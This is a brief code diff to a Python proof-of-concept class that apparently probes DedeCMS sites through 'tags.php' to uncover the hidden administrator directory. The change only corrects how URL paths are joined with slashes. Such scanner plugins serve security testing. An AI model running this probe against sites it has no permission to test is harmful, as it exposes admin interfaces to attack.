@@ -33,7 +33,7 @@ class POC(Script):
                 self.url_normpath(self.url, '../dedecms/'),
             ]))
             for path in path_list:
-                url = path + '/tags.php'
+                url = path + 'tags.php'
                 back_dir = ""
                 flag = 0
                 res = self.curl('get', url)
@@ -80,5 +80,5 @@ class POC(Script):
 
                     if x < 29 and flag ==1:
                         self.flag = 1
-                        self.req.append({"url": path+ back_dir})
-                        self.res.append({"info": path+ back_dir, "key": 'dede_manager'})
+                        self.req.append({"url": path+ '/'+back_dir})
+                        self.res.append({"info": path+'/'+ back_dir, "key": 'dede_manager'})
